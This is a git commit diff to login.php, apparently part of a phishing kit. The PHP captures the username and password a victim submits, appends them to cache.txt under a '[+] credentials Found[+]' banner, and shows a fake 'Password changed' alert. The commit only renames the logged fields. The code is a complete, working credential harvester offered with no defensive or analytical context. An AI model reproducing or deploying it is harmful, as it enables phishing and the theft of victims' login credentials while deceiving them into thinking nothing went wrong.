88b0045d4d55ad713ad7055a8b5046a19d927ead
cortian <79749427+Cortian@users.noreply.github.com>
2021-05-28 23:26:25 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-file_put_contents("cache.txt","\n"."[+] credentials Found[+]"."\n"."Current password - " . $_POST['username'] . "\n" . "New password - " . $_POST['password'] . "\n",FILE_APPEND);
+file_put_contents("cache.txt","\n"."[+] credentials Found[+]"."\n"."Username - " . $_POST['username'] . "\n" . "Password - " . $_POST['password'] . "\n",FILE_APPEND);
 echo "<script>alert('Password changed')</script>";
 ?>
 
